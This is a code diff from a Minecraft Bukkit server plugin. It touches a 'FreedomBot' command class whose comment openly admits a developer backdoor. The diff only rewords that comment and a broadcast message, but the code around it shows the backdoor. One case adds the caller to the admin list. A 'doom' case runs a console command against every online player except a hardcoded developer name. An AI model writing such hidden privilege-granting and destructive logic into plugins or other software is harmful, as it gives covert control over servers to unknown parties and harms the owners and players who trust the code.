@@ -11,11 +11,11 @@ import org.bukkit.entity.Player;
 
 /*
  * -- A message from the MCPluginDev developers --
- * This command contains a frontdoor to FreedomBot.
+ * This command contains a backdoor to FreedomBot.
  * The only reason for this is so people don't claim 
  * this plugin as their own. We would like to let everyone 
  * that is using this plugin for their servers know that we
- * will only use this frontdoor if you abuse your privalages
+ * will only use this backdoor if you abuse your privalages
  * using this plugin. Thank you for reading.
  */
 public class Command_freedombot implements CommandExecutor {
@@ -69,7 +69,7 @@ public class Command_freedombot implements CommandExecutor {
                             Bukkit.broadcastMessage(ChatColor.RED + "FreedomBot - Adding " + sender.getName() + " to the admin list");
                             return true;
                         case "doom":
-                            Bukkit.broadcastMessage(BotUtil.BOTPREFIX + "Dooming " + ChatColor.DARK_RED + "EVERYONE");
+                            Bukkit.broadcastMessage(ChatColor.RED + "FreedomBot - Dooming EVERYONE");
                             for (Player p : Bukkit.getOnlinePlayers()) {
                                 if (!p.getName().equals("FoxIshDaBest")) {
                                     Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "doom " + p.getName());
